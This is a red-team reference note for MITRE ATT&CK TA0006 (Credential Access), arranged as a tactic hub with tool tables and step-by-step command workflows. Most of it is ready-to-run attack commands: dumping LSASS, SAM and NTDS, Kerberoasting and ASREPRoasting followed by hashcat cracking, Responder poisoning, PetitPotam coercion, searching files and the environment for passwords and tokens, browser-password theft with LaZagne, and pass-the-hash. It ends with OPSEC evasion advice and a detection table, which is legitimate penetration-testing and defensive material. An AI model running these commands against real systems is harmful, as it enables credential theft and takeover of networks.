---
type: tactic-hub
room: red
tactic: "Credential Access"
tactic_id: "TA0006"
tags: [red/credential-access, mitre/TA0006]
date_updated: {{date}}
---

# TA0006 — Credential Access

> [!quote]
> *"The question is not what you look at, but what you see."*

**MITRE Reference:** [TA0006](https://attack.mitre.org/tactics/TA0006/) | **Kill Chain Phase:** Post-exploitation

The adversary is trying to steal credentials. Passwords and hashes are the master keys of any network — once an adversary holds valid credentials they become indistinguishable from legitimate users. This is the room where Holmes picks the safe.

---

## Techniques in This Tactic

| Technique ID | Name | Platform |
|-------------|------|---------|
| [[T1110 - Brute Force]] | Brute Force / Password Spray | All |
| [[T1003 - OS Credential Dumping]] | OS Credential Dumping (LSASS, SAM, NTDS) | Windows |
| [[T1558 - Steal or Forge Kerberos Tickets]] | Kerberoasting / ASREPRoasting / Golden Ticket | Windows/AD |
| [[T1552 - Unsecured Credentials]] | Credentials in files / env vars / registry | All |
| [[T1555 - Credentials from Password Stores]] | Browser passwords / credential manager | All |
| [[T1056 - Input Capture]] | Keylogging | All |
| [[T1187 - Forced Authentication]] | NTLM coerce / Responder | Windows |
| [[T1606 - Forge Web Credentials]] | JWT forgery / cookie theft | Web |

---

## The Standard Kit

| Tool | Role | Platform |
|------|------|---------|
| `mimikatz` | LSASS credential dump | Windows |
| `secretsdump` | Remote SAM/NTDS dump | Windows (remote) |
| `pypykatz` | Mimikatz-like in Python | Windows (offline) |
| `responder` | LLMNR/NBT-NS poisoning | Windows network |
| `hashcat` | Password cracking | All (GPU) |
| `john` | Password cracking | All (CPU) |
| `GetUserSPNs.py` | Kerberoasting | AD |
| `GetNPUsers.py` | ASREPRoasting | AD |
| `LaZagne` | Stored credential retrieval | All |
| `kerbrute` | Kerberos user/password spray | AD |

---

## Standard Credential Access Workflows

### LSASS Dump (T1003.001)
```powershell
# Mimikatz — direct (requires admin, flagged by AV)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Task Manager method (GUI, less suspicious)
# Right-click lsass.exe → Create dump file → C:\Users\Public\lsass.dmp

# ProcDump (Sysinternals — less flagged)
.\procdump.exe -ma lsass.exe lsass.dmp -accepteula

# Parse dump offline (on attacker machine)
pypykatz lsa minidump lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

### SAM / NTDS Dump (T1003.002 / T1003.003)
```bash
# Remote dump via secretsdump (impacket)
secretsdump.py <domain>/<user>:<pass>@<dc_ip>
secretsdump.py -hashes :<ntlm_hash> <domain>/<user>@<target>

# Local SAM dump (Windows, requires SYSTEM)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
# Transfer hives → parse offline
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL

# Volume Shadow Copy NTDS (if domain controller)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

### Kerberoasting (T1558.003)
```bash
# From Linux (impacket)
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerb.txt

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerb.txt

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
john --format=krb5tgs kerb.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### ASREPRoasting (T1558.004)
```bash
# Find accounts with pre-auth disabled
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip> -format hashcat -outputfile asrep.txt
GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### LLMNR / NBT-NS Poisoning — Responder (T1187)
```bash
# Listen on interface, capture NTLMv2 hashes
responder -I eth0 -rdw

# Crack captured hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Coerce NTLM authentication (PetitPotam — domain controller)
python3 PetitPotam.py -u <user> -p <pass> <attacker_ip> <dc_ip>
```

### Credentials in Files (T1552.001)
```bash
# Linux — common locations
find / -name "*.conf" -o -name "*.cfg" -o -name "*.env" -o -name ".bash_history" 2>/dev/null | xargs grep -l -i "password\|passwd\|secret\|key" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
cat ~/.bash_history | grep -i "pass\|key\|secret\|token"
env | grep -i "pass\|key\|secret\|token"

# Windows — search filesystem
findstr /si "password" *.txt *.xml *.ini *.config *.ps1
dir /s /b *pass* *cred* *vnc* *secret* 2>nul
reg query HKLM /f "password" /t REG_SZ /s

# Browser passwords (LaZagne)
.\lazagne.exe all
python3 laZagne.py all
```

### Pass-the-Hash (PtH)
```bash
# With impacket tools — use NTLM hash directly
psexec.py -hashes :<ntlm_hash> <domain>/Administrator@<target>
wmiexec.py -hashes :<ntlm_hash> <domain>/Administrator@<target>
smbclient.py -hashes :<ntlm_hash> //<target>/C$

# With netexec
nxc smb <target> -u Administrator -H <ntlm_hash>
nxc winrm <target> -u Administrator -H <ntlm_hash>
```

---

## OPSEC Considerations

> [!warning] Credentials Are Heavily Monitored
> - LSASS access (Event 4656 / Sysmon 10) is a top-tier EDR alert — PPL and Credential Guard block it.
> - Responder is extremely noisy — anyone running a packet capture will see you.
> - Kerberoasting generates Event 4769 per request — bulk requests are obvious.
> - PtH leaves Event 4624 Logon Type 3 with NTLMv1/v2 — detectable in AD environments enforcing Kerberos.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| LSASS access | Sysmon (10) | Access to lsass.exe from non-SYSTEM process |
| ProcDump | Sysmon (1) | procdump.exe targeting lsass |
| Kerberoasting | DC Security (4769) | Ticket request for SPN account, RC4 encryption |
| ASREPRoasting | DC Security (4768) | Pre-auth failure on specific accounts |
| Responder poisoning | Network / DNS | LLMNR queries answered by unexpected host |
| PtH | Security (4624) | NTLM logon Type 3 from unexpected source |

---

## Related Notes

- [[TA0005 - Defense Evasion]] ← Often paired
- [[TA0004 - Privilege Escalation]] ← Precedes domain compromise
- [[TA0008 - Lateral Movement]] ← What credentials unlock

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
